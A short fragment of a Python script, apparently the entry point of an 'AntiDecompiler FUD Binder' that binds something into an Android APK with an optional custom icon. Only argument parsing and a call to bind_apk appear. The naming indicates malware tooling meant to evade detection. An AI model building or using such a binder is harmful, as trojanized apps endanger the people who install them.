    if len(sys.argv) < 3:
        print("\n=== AntiDecompiler FUD Binder ===\n")
        print("Usage: python fud.py <target_apk> <output_name> [icon_path]\n")
        print("Example:")
        print("  python fud.py MyApp.apk Bound_MyApp.apk")
        print("  python fud.py MyApp.apk Bound_MyApp.apk custom_icon.png\n")
        sys.exit(1)

    target = sys.argv[1]
    output = sys.argv[2]
    icon = sys.argv[3] if len(sys.argv) > 3 else None

    if not os.path.exists(target):
        print(f"[FAIL] Target APK not found: {target}")
        sys.exit(1)

    result = bind_apk(target, icon, output)
